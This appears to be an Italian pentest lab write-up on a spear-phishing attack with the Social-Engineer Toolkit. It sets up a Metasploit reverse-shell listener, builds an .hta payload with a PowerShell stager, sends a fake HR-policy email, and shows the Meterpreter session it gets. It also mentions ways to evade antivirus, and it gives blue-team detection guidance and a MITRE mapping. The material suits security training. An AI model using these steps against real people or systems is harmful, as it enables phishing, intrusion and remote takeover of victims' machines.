> [English](README.en.md) | **Italiano**

# SET Spear-Phishing Attack Vectors: Email con Payload .hta

> - **Fase:** Social Engineering - Spear-Phishing Attack Vectors - Payload Delivery via Email
> - **Visibilita:** Alta - l'email transita attraverso il gateway di posta (potenziale detection); l'apertura del file .hta triggera Windows Defender/EDR; la connessione reverse shell genera traffico anomalo in uscita
> - **Prerequisiti:** SET installato su Kali Linux; SMTP relay configurato (o accesso diretto alla porta 25 del mail server target); indirizzo email della vittima (ottenuto via OSINT); Metasploit per il listener reverse shell
> - **Output:** Finding SE-004 (severity Alto); email consegnata con allegato .hta; reverse shell Meterpreter ottenuta dopo l'apertura dell'allegato da parte della vittima

- **Ambiente Operativo:** Kali Linux (Attaccante 192.168.0.110), Windows 10 VM (Vittima 192.168.0.120)
- **Target:** Utente aziendale con client email (Thunderbird)
- **Framework:** Social-Engineer Toolkit (SET) + Metasploit Framework
- **Tecnica Documentata:** Spear-Phishing Attack Vectors - Mass Email Attack con payload .hta

---

## Executive Summary

Lo spear-phishing con payload allegato e il vettore di Initial Access piu documentato nei report di threat intelligence (Mandiant M-Trends, CrowdStrike Global Threat Report). A differenza del phishing generico, lo spear-phishing e mirato a un individuo specifico con un pretesto credibile costruito sulla base di informazioni OSINT.

SET automatizza l'intero flusso: generazione del payload (in questo caso un file .hta con stager PowerShell), composizione dell'email con allegato, e invio tramite SMTP. Nel laboratorio e stata generata un'email con un pretesto aziendale credibile, allegando un file .hta che, una volta aperto dalla vittima, ha stabilito una reverse shell Meterpreter verso l'attaccante.

Il formato .hta (HTML Application) e stato scelto come vettore per la sua capacita di eseguire codice arbitrario sfruttando il motore mshta.exe nativo di Windows, senza richiedere installazione di runtime aggiuntivi. Sebbene i gateway moderni filtrino gli .hta, la tecnica resta didatticamente fondamentale per comprendere il principio del payload delivery via email.

---

## Finding SE-004: Spear-Phishing con Payload .hta e Reverse Shell

**ID Finding:** `SE-004` | **Severity:** `Alto` | **CVSS:** 8.1

Un attaccante puo inviare un'email mirata con allegato .hta che, una volta aperto, esegue uno stager PowerShell per stabilire una reverse shell. La tecnica combina social engineering (pretesto credibile) con execution (mshta.exe) per ottenere accesso remoto al sistema della vittima.

**Scenario PoC:** L'analista invia un'email all'utente target con allegato un file .hta mascherato da documento aziendale. L'apertura dell'allegato stabilisce una reverse shell Meterpreter verso la macchina attaccante.

### PoC - Fase 1: Setup del Listener Metasploit

Prima di inviare l'email, si configura il listener sulla macchina attaccante per ricevere la reverse shell.

```Bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.110
set LPORT 4444
exploit -j
```

```
[*] Payload handler running as background job 0.
[*] Started reverse TCP handler on 192.168.0.110:4444               <--
```

### PoC - Fase 2: Configurazione SET per Spear-Phishing

SET viene avviato e configurato per generare il payload, comporre l'email e inviarla tramite SMTP.

```Bash
sudo setoolkit
```

```
set> 1    # Social-Engineering Attacks

   1) Spear-Phishing Attack Vectors                   <--
   2) Website Attack Vectors
   3) Infectious Media Generator
   ...

set> 1
```

```
   1) Perform a Mass Email Attack                     <--
   2) Create a FileFormat Payload
   3) Create a Social-Engineering Template

set:phishing> 1
```

SET presenta la lista dei payload disponibili. Per questo laboratorio e stato selezionato un payload HTA con stager PowerShell.

```
 Select the file format exploit you want.

   1) Adobe Flash Player "Button" Remote Code Execution
   2) ...
  14) HTA Attack (Generate HTA payload)               <--
   ...

set:phishing> 14
```

```
[*] Generating HTA payload...
[-] LHOST for reverse connection: 192.168.0.110                      <--
[-] LPORT for reverse connection: 4444                               <--
[*] Payload creation complete.
[*] File stored at /root/.set/report.hta                             <--
```

### PoC - Fase 3: Composizione e Invio dell'Email

SET richiede i dettagli per la composizione dell'email.

```
   1) Use a GMAIL Account for your email attack.
   2) Use your own Email Server or Open Relay.         <--

set:phishing> 2

[-] From address (ex: john@company.com): hr-noreply@company-lab.local   <--
[-] From name: HR Department - Company Lab
[-] Username for SMTP: (leave blank for open relay)
[-] SMTP server: 192.168.0.130
[-] Port: 25
[-] To address: m.rossi@company-lab.local                                <--
[-] Subject: [Urgente] Aggiornamento Policy Aziendale - Azione Richiesta <--
[-] HTML or Plain (h/p): h
[-] First line of body: Si prega di aprire il documento allegato per
    confermare la presa visione della nuova policy aziendale.
[-] Next line (or END to finish): END

[*] SET has finished sending the emails.                                  <--
```

### PoC - Fase 4: Vittima Apre l'Allegato e Callback Reverse Shell

Sulla VM Windows, l'utente riceve l'email e apre l'allegato `report.hta`. Windows esegue il file tramite `mshta.exe`, che lancia lo stager PowerShell codificato nel file HTA. Lo stager scarica ed esegue in memoria il secondo stadio (Meterpreter), stabilendo la connessione reverse.

```
[*] Sending stage (176198 bytes) to 192.168.0.120                   <--
[*] Meterpreter session 1 opened (192.168.0.110:4444 ->
    192.168.0.120:49732) at 2026-03-28 14:23:51 +0200               <--

meterpreter > getuid
Server username: DESKTOP-LAB\m.rossi                                 <--

meterpreter > sysinfo
Computer        : DESKTOP-LAB
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
Meterpreter     : x86/windows
```

La reverse shell e attiva con i privilegi dell'utente `m.rossi`. Da questo punto l'attaccante puo procedere con la post-exploitation (privilege escalation, lateral movement, persistence).

---

## Impatto e Remediation (Blue Team)

L'esecuzione di un payload via email spear-phishing fornisce all'attaccante una shell interattiva sul sistema della vittima. L'impatto dipende dai privilegi dell'utente compromesso, ma anche un account non privilegiato consente raccolta dati, keylogging e pivot verso altri sistemi.

### Contromisure raccomandate

1. **Email Gateway con Sandboxing:** soluzioni come Proofpoint, Mimecast o Microsoft Defender for Office 365 eseguono gli allegati in sandbox prima della consegna, rilevando comportamenti malevoli (connessioni outbound, scrittura file, process injection).
2. **Blocco formati pericolosi:** bloccare a livello di gateway gli allegati .hta, .vbs, .js, .wsf, .scr e macro Office non firmate. Queste estensioni sono raramente necessarie per comunicazioni aziendali legittime.
3. **Application Whitelisting:** AppLocker o Windows Defender Application Control (WDAC) per bloccare l'esecuzione di mshta.exe da parte di utenti non autorizzati.
4. **Endpoint Detection and Response (EDR):** EDR moderni (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint) rilevano la catena mshta.exe che genera powershell.exe con connessione outbound.
5. **Security Awareness:** formazione specifica sullo spear-phishing con esercitazioni pratiche trimestrali; insegnare a non aprire allegati non attesi, anche se provengono da mittenti interni.

---

## Esperienza di Laboratorio

L'ambiente e stato configurato con un mail server di test (hMailServer sulla VM Windows o MailHog su Kali) per simulare il relay SMTP senza dipendere da servizi esterni. La configurazione iniziale ha richiesto attenzione: SET necessita di un SMTP relay funzionante sulla porta 25, e molti ISP bloccano questa porta in uscita.

La generazione del payload .hta e stata automatica: SET ha invocato internamente msfvenom per creare lo stager PowerShell embedded nell'HTML Application. Il file risultante (`report.hta`) e un documento HTML con tag `<script language="VBScript">` che esegue il payload tramite `mshta.exe`. L'analisi del codice sorgente ha rivelato che lo stager e un one-liner PowerShell encoded Base64 - la stessa tecnica documentata in `powershell-attack-vectors/`.

La composizione dell'email ha evidenziato l'importanza del pretesto: SET permette di personalizzare mittente, oggetto e corpo. Nel laboratorio e stato utilizzato un pretesto aziendale credibile ("Aggiornamento Policy - Azione Richiesta") con il campo From impostato su `hr-noreply@company-lab.local`. In un ambiente senza DMARC/SPF, questa email apparirebbe legittima al destinatario.

Il problema piu significativo riscontrato e stato il filtraggio dell'allegato: Windows Defender sulla VM Windows ha rilevato il file .hta al download. Per completare il laboratorio e stato necessario aggiungere un'esclusione temporanea in Defender. Questo conferma che la tecnica .hta grezza e oggi rilevata dalla maggior parte degli AV - in un engagement reale, l'attaccante utilizzerebbe tecniche di evasione (obfuscation del VBScript, encoding alternativo, o formati meno rilevati come .iso+.lnk).

La reverse shell Meterpreter si e stabilita con successo dopo l'apertura dell'allegato. Il tempo tra il doppio click e la shell e stato di circa 3 secondi - sufficientemente rapido da non insospettire l'utente, che vede solo una finestra che si apre e si chiude brevemente.

---

## Analisi Teorica: Anatomia di un Attacco Spear-Phishing

Lo spear-phishing si distingue dal phishing massivo per tre caratteristiche fondamentali:

1. **Targeting:** l'email e indirizzata a una persona specifica, con informazioni contestuali raccolte via OSINT (nome, ruolo, progetti in corso, colleghi).

2. **Pretexting:** il pretesto e costruito su misura per il target. Un'email da "HR" con oggetto "Policy aziendale" ha una probabilita di apertura molto superiore a un generico "Hai vinto un premio".

3. **Payload customization:** il payload e configurato per l'ambiente target (architettura, AV presente, policy di esecuzione).

Dal punto di vista tecnico, il file .hta sfrutta il motore `mshta.exe` (Microsoft HTML Application Host), un binario legittimo di Windows classificato come LOLBIN (Living Off the Land Binary). L'esecuzione di codice tramite LOLBIN e una tecnica di defense evasion perche utilizza eseguibili firmati Microsoft, rendendo piu difficile il rilevamento basato su firma.

La catena di esecuzione completa e: `mshta.exe` -> VBScript embedded -> `powershell.exe -ExecutionPolicy Bypass -EncodedCommand [Base64]` -> download stage 2 in memoria -> Meterpreter. Ogni passaggio rappresenta un'opportunita di detection per il difensore (process creation events, command line logging, network connections).

Nella kill chain, lo spear-phishing copre tre fasi consecutive: Weaponization (creazione del payload .hta), Delivery (invio dell'email), e Exploitation (esecuzione del payload alla vittima). La fase successiva - Installation/Persistence - richiede azioni post-exploitation aggiuntive documentate nel modulo 07.

---

## Scenario Reale: Campagna Spear-Phishing Mirata

> Questa sezione descrive come SE-004 si inserirebbe in un engagement reale contro un'organizzazione target.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** OSINT completata; lista email dipendenti e organigramma aziendale ottenuti; identificato il target primario (utente con accesso a sistemi critici); SMTP relay disponibile o dominio look-alike configurato con SPF valido.

**Kill Chain proiettata:**

```
OSINT: email target + ruolo aziendale + colleghi + progetti attivi
        |
        v
Weaponization: payload .hta con stager PowerShell (o formato moderno: .iso+.lnk)
        |
        v
SE-004: email spear-phishing con pretesto contestuale + allegato
        |
        v
Vittima apre allegato -> mshta.exe -> PowerShell -> reverse shell
        |
        v
Post-Exploitation: enumeration, credential dumping, persistence
        |
        v
Lateral Movement -> Privilege Escalation -> Domain Compromise
```

**Impatto potenziale:** la reverse shell fornisce accesso interattivo al sistema della vittima. Se l'utente ha privilegi elevati o accesso a dati sensibili (file share, database, email), l'impatto e immediato. Anche da un account non privilegiato, l'attaccante puo eseguire privilege escalation locale (EXPLOIT-013..019) e poi muoversi lateralmente.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** monitoraggio email gateway per allegati con estensioni pericolose; alert su process creation chains anomale (mshta.exe che genera powershell.exe); monitoraggio connessioni outbound da processi non-browser verso IP non categorizzati.

**Indicatori di Compromissione (IOC):**
- Email con allegato .hta, .vbs, .js da mittenti esterni o domini look-alike
- Process tree: `outlook.exe` -> `mshta.exe` -> `powershell.exe` (Sysmon Event ID 1)
- PowerShell con flag `-EncodedCommand` e/o `-ExecutionPolicy Bypass` (Event ID 4104)
- Connessione TCP outbound dalla workstation verso IP non categorizzato su porta non-standard

**Contenimento:** isolamento immediato della workstation dalla rete; kill del processo mshta.exe e dei processi figli; acquisizione forense della memoria (volatility) prima del reboot; reset credenziali dell'utente compromesso.

**Eradicazione e hardening:**
- Blocco di mshta.exe e wscript.exe via AppLocker per utenti non-IT
- Deploy di AMSI (Antimalware Scan Interface) per ispezione PowerShell in-memory
- Abilitazione Script Block Logging e Module Logging per PowerShell (Event ID 4104)
- Email gateway con detonation chamber (sandbox) per tutti gli allegati eseguibili

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Utilizzo di SET e msfvenom per generazione del payload .hta e composizione dell'email spear-phishing. |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | Email mirata con allegato .hta inviata al target tramite SMTP relay. |
| Execution | User Execution: Malicious File | `T1204.002` | La vittima apre l'allegato .hta, attivando l'esecuzione del payload tramite mshta.exe. |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Lo stager PowerShell encoded Base64 esegue il download e l'iniezione in memoria del secondo stadio (Meterpreter). |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato (VirtualBox, rete NAT/Bridge isolata). L'email e stata inviata a un mail server locale di test. Nessuna email di phishing e stata inviata a persone o organizzazioni reali.
